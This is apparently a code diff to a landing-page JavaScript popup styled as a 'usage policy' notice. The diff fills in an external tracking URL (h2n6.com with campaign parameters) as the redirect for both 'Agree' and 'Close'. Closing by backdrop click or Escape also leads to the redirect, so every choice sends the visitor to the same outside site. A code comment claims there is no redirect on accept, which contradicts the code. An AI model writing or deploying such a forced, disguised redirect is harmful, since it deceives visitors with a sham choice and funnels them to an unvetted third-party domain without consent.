@@ -13,8 +13,8 @@ document.addEventListener('DOMContentLoaded', () => {
         text:  'Welcome to our landing page. Please review and accept our usage policy to continue exploring.',
         yes:   'Agree',
         no:    'Close',
-        redirectOnClose:  'link paste here', // redirect when closed (lander)
-        redirectOnAccept: 'link paste here'                                         // no redirect on accept (lander)
+        redirectOnClose:  'https://h2n6.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]', // redirect when closed (lander)
+        redirectOnAccept: 'https://h2n6.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]'                                         // no redirect on accept (lander)
       }
     : {
         title: 'Policy Notice',
@@ -84,5 +84,6 @@ document.addEventListener('DOMContentLoaded', () => {
   bd.addEventListener('click', (e) => { if (e.target === bd) handleClose(); });
   window.addEventListener('keydown', (e) => { if (e.key === 'Escape') handleClose(); });
 });
+
 
 
